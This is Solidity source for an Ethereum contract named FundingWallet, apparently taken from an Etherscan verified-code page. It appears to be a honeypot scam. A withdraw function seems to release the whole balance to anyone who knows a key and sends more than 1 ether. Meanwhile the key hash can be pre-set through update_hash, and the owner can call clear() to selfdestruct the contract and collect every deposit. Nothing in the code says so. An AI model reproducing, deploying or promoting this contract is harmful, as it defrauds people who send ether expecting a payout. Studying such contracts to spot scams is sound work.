/**
 * Source Code first verified at https://etherscan.io on Monday, March 25, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract  
 FundingWallet{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x65e40f866a57923fb46b18549dba76f1c748d751aa0d4b8b45a37297b734dc28;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 1 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function update_hash(bytes32 _keyHash) public
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}